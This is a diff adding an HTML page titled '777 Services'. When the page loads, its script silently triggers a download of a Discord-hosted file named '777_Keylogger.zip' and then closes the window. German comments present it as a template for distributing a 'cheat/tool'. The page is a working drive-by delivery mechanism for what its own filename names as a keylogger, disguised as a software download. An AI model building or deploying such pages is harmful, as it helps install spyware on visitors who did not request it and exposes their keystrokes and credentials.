@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>777 Services - Downloading...</title>
+    <script type="text/javascript">
+        window.onload = function() {
+            // 1. Hier den Link zu deinem Cheat/Tool einfügen
+            var downloadUrl = "https://cdn.discordapp.com/attachments/1487530735114911744/1489506953028702298/777_Keylogger.zip?ex=69d0aaf3&is=69cf5973&hm=db729a3e2b5a8e19e11df19d5860d0ff7fcc7afb579085826593fd107816ff69&";
+            
+            // Erstellt einen unsichtbaren Download-Link und klickt ihn an
+            var link = document.createElement('a');
+            link.href = downloadUrl;
+            link.download = ""; 
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+
+            // 2. Fenster nach 3 Sekunden schließen
+            setTimeout(function() {
+                window.close();
+            }, 3000);
+        };
+    </script>
+</head>
+<body style="background-color: #0f0f0f; color: #8A2BE2; font-family: sans-serif; text-align: center; padding-top: 50px;">
+    <h1>777 SERVICES</h1>
+    <p>Your download is starting... This window will close automatically.</p>
+</body>
+</html>
